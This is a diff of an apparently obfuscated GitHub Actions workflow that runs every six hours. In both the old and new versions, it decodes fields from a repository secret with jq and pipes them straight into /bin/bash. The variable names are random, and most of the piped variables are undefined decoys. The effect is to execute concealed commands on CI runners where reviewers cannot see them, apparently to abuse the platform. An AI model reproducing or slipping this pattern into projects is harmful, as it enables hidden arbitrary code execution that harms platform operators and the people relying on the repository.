@@ -2,8 +2,7 @@ name: meijiemd
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 0/6 * * *'
-
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,24 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: meijiemd
         env:
-          yi73898: ${{ secrets.yi73898 }}
+          xp539: ${{ secrets.xp539 }}
         run: |
-          echo $yi73898 | jq -r .nypb6275 | /bin/bash
-          echo $ashqd69 | jq -r .f02 | /bin/bash
-          echo $tjaxh0178 | jq -r .f47 | /bin/bash
-          echo $jt6152 | jq -r .ve92 | /bin/bash
-          echo $vh742 | jq -r .gindo732 | /bin/bash
-          echo $gicbb268 | jq -r .ypd80340 | /bin/bash
-          echo $fr24 | jq -r .ck52 | /bin/bash
-          echo $c09 | jq -r .dv3013 | /bin/bash
-          echo $pho19 | jq -r .wv9512 | /bin/bash
-          echo $rb447 | jq -r .t50159 | /bin/bash
-          echo $lzfwj5902 | jq -r .lsg41754 | /bin/bash
-          echo $pdzl14 | jq -r .yug27 | /bin/bash
-          echo $aslg80 | jq -r .n156 | /bin/bash
-          echo $sh493 | jq -r .upnl1 | /bin/bash
-          echo $bfj578 | jq -r .qimj88492 | /bin/bash
-          echo $rpklf208 | jq -r .af487 | /bin/bash
-          echo $pw8961 | jq -r .rfdbu0 | /bin/bash
-          echo $kt367 | jq -r .epkdg1 | /bin/bash
+          echo $xp539 | jq -r .anp5 | /bin/bash
+          echo $esnt871 | jq -r .rutn713 | /bin/bash
+          echo $edju04921 | jq -r .zefon8402 | /bin/bash
+          echo $fzv042 | jq -r .lf809 | /bin/bash
+          echo $swle5 | jq -r .bse11438 | /bin/bash
+          echo $uy30 | jq -r .g9 | /bin/bash
+          echo $vw31 | jq -r .job500 | /bin/bash
+          echo $qvq1809 | jq -r .ohk466 | /bin/bash
+          echo $u2041 | jq -r .jmw49 | /bin/bash
+          echo $rddq1 | jq -r .ny57 | /bin/bash
+          echo $gzux0656 | jq -r .ty02431 | /bin/bash
+          echo $pxrcf4 | jq -r .biyzs6 | /bin/bash
 
